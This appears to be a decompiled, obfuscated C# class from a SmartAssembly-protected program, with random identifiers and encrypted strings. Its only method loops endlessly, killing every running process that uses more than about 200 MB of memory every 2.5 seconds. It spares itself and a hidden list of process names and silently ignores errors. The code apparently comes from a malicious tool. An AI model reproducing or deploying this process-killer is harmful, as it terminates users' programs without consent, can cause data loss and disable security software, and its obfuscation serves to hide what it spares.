using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wDtIYaxdpawEu;

public static class HnajMQVCpr
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void HLgcGHDmEtjgF()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107377111)) && !process.ProcessName.Contains(getString_0(107377102)) && !process.ProcessName.Contains(getString_0(107377125)) && !process.ProcessName.Contains(getString_0(107377116)) && !process.ProcessName.Contains(getString_0(107377071)) && !process.ProcessName.Contains(getString_0(107377090)) && !process.ProcessName.Contains(getString_0(107377045)) && !process.ProcessName.Contains(getString_0(107377064)) && !process.ProcessName.Contains(getString_0(107377051)) && !process.ProcessName.Contains(getString_0(107377006)) && !process.ProcessName.Contains(getString_0(107376985)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static HnajMQVCpr()
	{
		Strings.CreateGetStringDelegate(typeof(HnajMQVCpr));
	}
}
